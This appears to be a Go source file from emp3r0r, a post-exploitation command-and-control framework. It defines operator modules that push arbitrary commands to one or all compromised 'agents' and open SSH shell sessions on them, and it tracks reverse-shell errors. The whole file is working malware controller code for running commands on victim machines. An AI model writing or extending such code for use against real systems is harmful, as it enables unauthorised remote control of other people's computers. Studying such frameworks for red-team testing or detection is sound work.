//go:build linux
// +build linux

package cc

import (
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
)

// RShellStatus stores errors from reverseBash
var RShellStatus = make(map[string]error)

// moduleCmd exec cmd on target
func moduleCmd() {
	// send command
	execOnTarget := func(target *emp3r0r_def.Emp3r0rAgent) {
		if Targets[target].Conn == nil {
			LogError("moduleCmd: agent %s is not connected", target.Tag)
			return
		}
		cmdOpt, ok := AvailableModuleOptions["cmd_to_exec"]
		if !ok {
			LogError("Option 'cmd_to_exec' not found")
			return
		}
		err := SendCmd(cmdOpt.Val, "", target)
		if err != nil {
			LogError("moduleCmd: %v", err)
		}
	}

	// find target
	target := ActiveAgent
	if target == nil {
		LogWarning("emp3r0r will execute `%s` on all targets this time", AvailableModuleOptions["cmd_to_exec"].Val)
		for per_target := range Targets {
			execOnTarget(per_target)
		}
		return
	}

	// write to given target's connection
	if Targets[target] == nil {
		LogError("moduleCmd: agent control interface not found")
		return
	}
	execOnTarget(target)
}

// moduleShell set up an ssh session
func moduleShell() {
	// find target
	target := ActiveAgent
	if target == nil {
		LogError("Module shell: target does not exist")
		return
	}

	// write to given target's connection
	tControl := Targets[target]
	if tControl == nil {
		LogError("moduleShell: agent control interface not found")
		return
	}
	if tControl.Conn == nil {
		LogError("moduleShell: agent is not connected")
		return
	}

	// options
	shellOpt, ok := AvailableModuleOptions["shell"]
	if !ok {
		LogError("Option 'shell' not found")
		return
	}
	shell := shellOpt.Val

	argsOpt, ok := AvailableModuleOptions["args"]
	if !ok {
		LogError("Option 'args' not found")
		return
	}
	args := argsOpt.Val

	portOpt, ok := AvailableModuleOptions["port"]
	if !ok {
		LogError("Option 'port' not found")
		return
	}
	port := portOpt.Val

	// run
	err := SSHClient(shell, args, port, false)
	if err != nil {
		LogError("moduleShell: %v", err)
	}
}
